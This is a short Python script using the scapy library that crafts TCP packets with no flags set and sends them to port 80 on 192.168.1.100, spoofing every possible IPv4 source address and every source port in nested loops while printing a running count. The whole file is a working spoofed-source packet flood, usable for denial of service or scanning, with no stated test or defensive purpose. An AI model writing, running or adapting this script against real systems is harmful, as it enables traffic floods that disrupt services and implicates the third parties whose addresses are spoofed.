from scapy.all import *

def tcpnoflag(packet):
	sendp(packet)

eth = Ether()
ip = IP()
ip.dst = '192.168.1.100'
tcp = TCP()
tcp.dport = 80
tcp.flags = 0

m = 0
for i in range(0,256):
	for j in range(0,256):
		for k in range(0,256):
			for n in range(0,256):
				for sp in range(0,65535):
					ip.src = str(i)+'.'+str(j)+'.'+str(k)+'.'+str(n)
					tcp.sport = sp
					packet = eth/ip/tcp
					tcpnoflag(packet)
					print('Sending Packet To %s' %ip.dst + 'Post Is %s'%tcp.dport)
					m = m + 1
					print(m)